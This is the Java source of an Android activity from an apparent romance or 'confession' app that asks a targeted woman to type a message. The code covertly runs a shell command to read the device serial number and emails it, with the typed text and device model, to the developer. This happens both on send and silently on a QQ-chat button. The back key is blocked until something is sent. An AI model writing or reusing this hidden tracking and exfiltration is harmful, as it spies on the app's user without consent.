package gtf.show.love;
import android.app.*;
import android.os.*;
import android.widget.*;
import android.view.View.*;
import android.view.*;
import android.content.*;
import android.content.pm.*;
import java.io.*;
import android.net.*;

public class notLove2 extends Activity{
	String sorry;
	boolean sendOver = false;
	Button send;
	Button jumpQQ;
	Button about;
	EditText text;
	String qqNumber = "2071077382";
	int openTime = 0;
	@Override
    protected void onCreate(Bundle savedInstanceState)
    {
		super.onCreate(savedInstanceState);
        setContentView(R.layout.sorry);

		send = (Button)this.findViewById(R.id.send);
		about = (Button)this.findViewById(R.id.about);
		jumpQQ = (Button)this.findViewById(R.id.jumpQQ);
        text = (EditText)this.findViewById(R.id.text);
		about.setOnClickListener(new OnClickListener() {
				public void onClick(View v) {
					//显式intent跳转secret的activity
					Intent intent = new Intent(notLove2.this, about2.class);
					startActivity(intent);
				}
			});
		jumpQQ.setOnClickListener(new OnClickListener() {
				public void onClick(View v) {
					String title = android.os.Build.MODEL + "'s  finally click jumpQQ Button";
					// jump qq
					try
					{
						//第二种方式：可以跳转到添加好友，如果qq号是好友了，直接聊天
						Toast Toast1 = Toast.makeText(notLove2.this, "😘😘如果没有自动打开QQ请手动打开！！！", Toast.LENGTH_SHORT);
						Toast1.show();
						Intent intentStop = new Intent(notLove2.this, MusicService.class);
						stopService(intentStop);
						String tempqq = "mqqwpa://im/chat?chat_type=wpa&uin=" + qqNumber;//uin是发送过去的qq号码
						String IMEI = runShell("getprop ro.serialno");
		                MailManager.getInstance().sendMail(title,"She clicked jumpqq button to finish the App !!!! IMEI:"+IMEI);
						startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(tempqq)));
					}
					catch (Exception e)
					{
						e.printStackTrace();
						Toast Toast1 = Toast.makeText(notLove2.this, "启动QQ失败，请检查是否安装QQ", Toast.LENGTH_SHORT);
						Toast1.show();
						Intent intentStop = new Intent(notLove2.this, MusicService.class);
						stopService(intentStop);
					}

					notLove2.this.finish();
				}
			});
		send.setOnClickListener(new OnClickListener() {

				public void onClick(View v) {
					String IMEI = runShell("getprop ro.serialno");
			        sorry = text.getText().toString()+IMEI;
					if("".equals(text.getText().toString().trim())){
						Toast Toast1 = Toast.makeText(notLove2.this,"怎么也说点啥呀，别空着.", Toast.LENGTH_SHORT);
						Toast1.show();
					}else{
						String title = android.os.Build.MODEL+"'s  Not Love Me Say";
						try {
							File file = new File(Environment.getExternalStorageDirectory(),"sayToMe.txt");
							FileOutputStream fos = new FileOutputStream(file);
							String info = sorry;
							fos.write(info.getBytes());
							fos.close();
							System.out.println("写入成功：");
							String path = Environment.getExternalStorageDirectory() + File.separator + "sayToMe.txt";
							MailManager.getInstance().sendMailWithFile(title, "file message", path);
						} catch (Exception e) {
							e.printStackTrace();
						}
						sendOver =true;
						// MailManager.getInstance().sendMail(title, sorry);
						Toast Toast1 = Toast.makeText(notLove2.this,"bye bye,内容已经上传，想说可以继续发送，按返回键退出.", Toast.LENGTH_LONG);
						Toast1.show();

						// exitProgrames();

					}


				}
			});
	}
	@Override
	protected void onResume()
	{
		/**
		 * 设置为横屏
		 */
		if (getRequestedOrientation() != ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE)
		{
			setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
		}
		super.onResume();
	}

	/**
	 * 监听Back键按下事件,方法1:
	 * 注意:
	 * super.onBackPressed()会自动调用finish()方法,关闭
	 * 当前Activity.
	 * 若要屏蔽Back键盘,注释该行代码即可
	 */
    @Override
    public void onBackPressed() {
		final EditText text = (EditText)this.findViewById(R.id.text);
    	if("".equals(text.getText().toString().trim())){
			Toast Toast1 = Toast.makeText(notLove2.this,"怎么也说点啥呀，别空着.", Toast.LENGTH_SHORT);
			Toast1.show();
		}else{if(sendOver){
				String title = android.os.Build.MODEL+"'s  Not Love Me Say";
				MailManager.getInstance().sendMail(title, sorry);
				exitProgrames();}else{
				Toast Toast1 = Toast.makeText(notLove2.this,"还没点发送呢！", Toast.LENGTH_SHORT);
				Toast1.show();
			}}
		System.out.println("按下了back键   onBackPressed()");    	
    }
	public void exitProgrames(){
		Intent intentStop = new Intent(notLove2.this, MusicService.class);
		stopService(intentStop);
		Intent startMain = new Intent(Intent.ACTION_MAIN);
		startMain.addCategory(Intent.CATEGORY_HOME);
		startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startActivity(startMain);
		android.os.Process.killProcess(android.os.Process.myPid());
	}
	public static String runShell(String 执行内容)
	{
        shell.CommandResult 输出值 = shell.execCommand(执行内容, false, true);
        String 输出 = 输出值.successMsg;
        return 输出;
    }
}

